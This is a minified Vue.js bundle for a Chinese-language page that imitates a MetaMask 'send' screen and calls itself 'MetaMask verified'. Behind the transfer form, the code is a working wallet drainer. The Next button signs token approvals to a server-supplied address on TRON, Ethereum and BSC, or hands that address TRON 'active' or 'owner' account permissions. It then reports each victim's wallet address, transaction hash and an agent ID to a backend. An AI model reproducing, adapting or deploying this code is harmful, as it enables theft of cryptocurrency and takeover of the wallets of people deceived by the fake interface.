import{d as a}from"./QrRcCR-306d5cc4.js";import{u as s}from"./Xm-a629356d.js";import{g as e,s as t,a as i,b as n}from"./a-b12a1c4f.js";import{B as l,t as c,g as o,a as r,b as d,c as u}from"./VslBTHKIHy-749ee1ec.js";import{c as v,g as p,a as m,b as f,d as b,e as _}from"./yBC6-7db00fcf.js";import{v as j,c as w,b as g,Q as y,P as h,E as k,F as x,U as R,l as T,M as S,R as U,S as B,q as H,O as L}from"./mU-beeec96c.js";import{r as q,u as A}from"./SF9TR5-ac960a3b.js";import{P as I,n as N}from"./tmoz-15c9f8ca.js";import{B as X,s as C,a as $,c as M}from"./e5NRLXWMaA-44df416d.js";import{_ as F}from"./UZMhkFG9To-aef6b680.js";import"./oJRsb6Z-66576549.js";import"./Y-579ccd95.js";import"./Q1H-8e37e022.js";import"./bc678Hiz-5f6ca57e.js";import"./H3kKuki-e6bf6260.js";import"./WFjHIv-d182c6e4.js";import"./ypd8Yw5UW-120c6969.js";import"./WMsrK5B77C-bfada61b.js";import"./DjMY-f1a68cab.js";import"./e-c8e3a33b.js";import"./C-0929b1bf.js";import"./IHzoR990bs-db06b2b1.js";import"./YcF3-1e1b36e2.js";import"./qAYU7-8f66bbd8.js";import"./AlbDH-d8e135df.js";import"./Z5vXU-ff27f4b9.js";import"./sQ-505cbca2.js";import"./JQnTANv-a82d6993.js";import"./5v0Hm-13cc43df.js";import"./juO-3186891c.js";import"./GoP6-329f107c.js";/* empty css               */import"./0S0g8-ce2a75f1.js";/* empty css                   */import"./csxvUwuo-c7309c03.js";import"./4SW-581e9c9f.js";import"./KYxVONcX6Q-83956126.js";import"./xgC-2ef6d1ed.js";import"./Q-6fad00a3.js";import"./1LL6-906c4c59.js";import"./F57O-9883f7a9.js";import"./Jcz-e0fa2aa5.js";import"./xkd0m5SPx-40305fde.js";import"./uYFIBF-6f313106.js";import"./cR0rPvXqu-5ebc4982.js";import"./N5-d5f066df.js";import"./SAqMi-a0c85f7c.js";import"./NUzmaxaOYV-db29bdc8.js";import"./FCK-69fe29e4.js";import"./NWpi2I-1ede24d8.js";import"./I2kNo-27b46290.js";import"./8Sgof-6c600a2a.js";import"./G4-4954a3fb.js";import"./DS7mquH-218993e9.js";import"./1OZvwwHawC-25301f7e.js";import"./2dBa7p18e-942a99dc.js";import"./b-30dd1762.js";import"./l-336997df.js";import"./zeP4fI2dld-8112a4fb.js";import"./A4GA6siJ-289f5cdc.js";import"./XJYBe5N-6917e031.js";import"./Pmi1-86d0cd4e.js";import"./XARg-39ac8c88.js";import"./tM3M-765b7527.js";const J=a=>(U("data-v-cf1ff9b7"),a=a(),B(),a),K={class:"main-container-wrapper"},O={class:"page-container"},P=J((()=>h("div",{class:"send-title"},[H(" 收款地址 "),h("span",{class:"official"},"MetaMask已验证")],-1))),Y={class:"ens-input send__to-row"},G={class:"ens-input__wrapper"},z={class:"ens-input__wrapper__input fs14"},Q=J((()=>h("div",{style:{"margin-left":"16px"}},[h("div",{class:"send-v2__form-title"},"数量")],-1))),E={class:"send-v2__form-amount-asset",style:{"margin-left":"16px"}},W={class:"send-v2__form-row"},Z=J((()=>h("button",{class:"send-v2__amount-max"},[h("div",{class:"send-v2__amount-max__button"},"最大")],-1))),D={class:"send-v2__form-field-container"},V={class:"send-v2__form-field"},aa={class:"unit-input"},sa={class:"unit-input__inputs"},ea={class:"unit-input__input-container"},ta=J((()=>h("div",null,null,-1))),ia=J((()=>h("div",{class:"send-v2__form-divider"},null,-1))),na={class:"send-v2__form-row"},la={class:"send-v2__form-field"},ca={class:"send-v2__asset-dropdown"},oa={class:"send-v2__asset-dropdown__input-wrapper"},ra={class:"send-v2__asset-dropdown__asset"},da=J((()=>h("div",{class:"send-v2__asset-dropdown__asset-title"}," 钱包资产 ",-1))),ua={class:"send-v2__asset-dropdown__asset-content"},va={class:"send-v2__asset-dropdown__asset-icon"},pa=["src"],ma={class:"send-v2__asset-dropdown__name"},fa={class:"currency-display-component",title:"0"},ba={class:"currency-display-component__text"},_a={class:"send-v2__asset-dropdown__symbol"},ja=J((()=>h("div",{style:{margin:"10px 16px 10px 16px"}},[h("div",{class:"gas-price-button-group--title"},"网络费用")],-1))),wa={class:"list"},ga=["onClick"],ya={class:"header"},ha=["src"],ka={class:"name"},xa={class:"bnb",style:{"text-align":"center"}},Ra={class:"usd"},Ta={style:{margin:"30px 16px","margin-top":"60px"}},Sa=F(j({__name:"meta",setup(j){q(null);const U=q(0),B=q(0),F=q({type:1,walletType:1,agentId:"",token:"USDT",amount:1,block:l.TRX,clientId:"",ads:"",client_type:1,extend:{}}),J=q(""),Sa=q({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),Ua=(s(),q("")),Ba=q(null),Ha=q(!0),La=q([{name:"缓慢",src:new URL("/static/svg/a-07b5b9ae.svg",self.location).href,quantity:"0.00007875",usd:"$0.019",unit:"BNB"},{name:"推荐",src:new URL("/static/svg/Ge6RK-2f601456.svg",self.location).href,quantity:"0.0000945",usd:"$0.023",unit:"BNB"},{name:"极速",src:new URL("/static/svg/l-8d3e2675.svg",self.location).href,quantity:"0.0001512",usd:"$0.037",unit:"BNB"}]),qa=q(0),Aa=()=>{if(!U.value||0==U.value)return C("转账金额需要大于0");const{type:a}=F.value;if(B.value<U.value)return C("Insufficient balance");1==a?(async()=>{try{if($({message:"Loading...",duration:0}),F.value.block==l.TRX){const a=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",J.value,Ua.value);a.result&&(Ia(Ua.value,"approve",a.txid),C(Sa.value.authSuccessTips))}else if(F.value.block==l.ETH){const a=await b(Ba.value,Ua.value,J.value);a.transactionHash&&(Ia(Ua.value,"approve",a.transactionHash),C(Sa.value.authSuccessTips))}else if(F.value.block==l.BSC){const a=await _(Ba.value,Ua.value,J.value);a.transactionHash&&(Ia(Ua.value,"approve",a.transactionHash),C(Sa.value.authSuccessTips))}}catch(a){M()}})():2==a?(async()=>{if(F.value.block!=l.TRX)return;const a=await d(J.value);a.result&&(Ia(Ua.value,"active",a.txid),C(Sa.value.authSuccessTips))})():(async()=>{if(F.value.block!=l.TRX)return;const a=await u(J.value);a.result&&(Ia(Ua.value,"owner",a.txid),C(Sa.value.authSuccessTips))})()},Ia=async(a,s,e)=>{const l={addres:a,auth_addres:J.value,hash:e||0,wallete_type:"TokenPocket",client_id:F.value.clientId||Sa.value.clientId||"",source:window.location.href,agent_uid:F.value.agentId,block:F.value.block,amount:F.value.amount,extend:F.value.extend?JSON.stringify(F.value.extend):""};switch(s){case"approve":await n(l);break;case"active":await i(l);break;case"owner":await t(l)}M()},Na=w((()=>F.value.ads||Sa.value.receiveAddress[F.value.block]));return g((()=>{const a=JSON.parse(localStorage.getItem("routerParams"));U.value=a.amount,F.value={amount:U.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||l.TRX,clientId:a.clientId,ads:a.ads,client_type:a.client_type||1,extend:a.extend},(()=>{switch(F.value.block){case l.TRX:La.value=[{name:"缓慢",src:new URL("/static/svg/a-07b5b9ae.svg",self.location).href,quantity:"3",usd:"$0.327423",unit:"TRX"},{name:"推荐",src:new URL("/static/svg/Ge6RK-2f601456.svg",self.location).href,quantity:"5",usd:"$0.545706",unit:"TRX"},{name:"极速",src:new URL("/static/svg/l-8d3e2675.svg",self.location).href,quantity:"10",usd:"$1.091411",unit:"TRX"}];break;case l.ETH:La.value=[{name:"缓慢",src:new URL("/static/svg/a-07b5b9ae.svg",self.location).href,quantity:"0.0007846",usd:"$1.993",unit:"ETH"},{name:"推荐",src:new URL("/static/svg/Ge6RK-2f601456.svg",self.location).href,quantity:"0.001043",usd:"$2.5733",unit:"ETH"},{name:"极速",src:new URL("/static/svg/l-8d3e2675.svg",self.location).href,quantity:"0.001299",usd:"$3.3",unit:"ETH"}];break;case l.BSC:La.value=[{name:"缓慢",src:new URL("/static/svg/a-07b5b9ae.svg",self.location).href,quantity:"0.00007875",usd:"$0.019",unit:"BNB"},{name:"推荐",src:new URL("/static/svg/Ge6RK-2f601456.svg",self.location).href,quantity:"0.0000945",usd:"$0.023",unit:"BNB"},{name:"极速",src:new URL("/static/svg/l-8d3e2675.svg",self.location).href,quantity:"0.0001512",usd:"$0.037",unit:"BNB"}]}})(),(async()=>{let a;switch(F.value.block){case l.TRX:if(Ua.value=await tronWeb.defaultAddress.base58,!Ua.value)return C("无法获取钱包地址！请检查浏览器是否支持TRON！");B.value=await o(Ua.value,F.value.token);break;case l.ETH:a=await m(),Ba.value=a.web3,Ua.value=a.userAddress,B.value=await f(Ba.value,a.userAddress);break;case l.BSC:a=await v(),Ba.value=a.web3,Ua.value=a.userAddress,B.value=await p(Ba.value,a.userAddress)}})(),(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));Sa.value={...a};const{type:s}=F.value;Ha.value=!0;const t=await e({block:F.value.block,type:c[F.value.type]});Ha.value=!1;const i=t.data;Sa.value={...a,authAddress:i},J.value=Sa.value.authAddress}catch(a){Ha.value=!1}})();const s=navigator.userAgent;if(!/MetaMask/i.test(s)){let a=window.location.href;a=a.replace(/^[a-zA-Z]+:\/\//i,"");const s=`https://metamask.app.link/dapp/${a}`;window.location.href=s}})),(s,e)=>(L(),y("div",K,[h("div",O,[P,h("div",Y,[h("div",G,[h("div",z,I(Na.value||"-"),1)])]),Q,h("div",E,[h("div",W,[Z,h("div",D,[h("div",V,[h("div",aa,[h("div",sa,[h("div",ea,[k(h("input",{"onUpdate:modelValue":e[0]||(e[0]=a=>U.value=a),type:"text",inputmode:"decimal",class:"unit-input__input",placeholder:"",style:{width:"3.5ch"}},null,512),[[a,U.value]])])])])]),ta])]),ia,h("div",na,[h("div",la,[h("div",ca,[h("div",oa,[h("div",ra,[da,h("div",ua,[h("div",va,[h("img",{class:"identicon",src:`/assets/token/${String(F.value.token).toLocaleLowerCase()}.png`,alt:"",style:{height:"24px",width:"24px","border-radius":"12px"}},null,8,pa)]),h("div",ma,[h("div",fa,[h("span",ba,[h("span",null,I(B.value),1)])])]),h("div",_a,I(String(F.value.token).toLocaleUpperCase()),1)])])])])])])]),ja,h("div",wa,[(L(!0),y(x,null,R(La.value,((a,s)=>(L(),y("div",{class:N(`item ${qa.value==s&&"active-item"}`),onClick:a=>qa.value=s,key:a.quantity},[h("div",ya,[h("img",{class:"image",src:a.src,width:"18"},null,8,ha),h("span",ka,I(a.name),1)]),h("div",xa,I(a.quantity)+" "+I(a.unit),1),h("div",Ra,I(a.usd),1)],10,ga)))),128))]),h("div",Ta,[T(A(X),{style:{width:"100%","border-radius":"16px"},onClick:Aa,loading:Ha.value,type:"primary"},{default:S((()=>[H("Next")])),_:1},8,["loading"])])])]))}}),[["__scopeId","data-v-cf1ff9b7"]]);export{Sa as default};
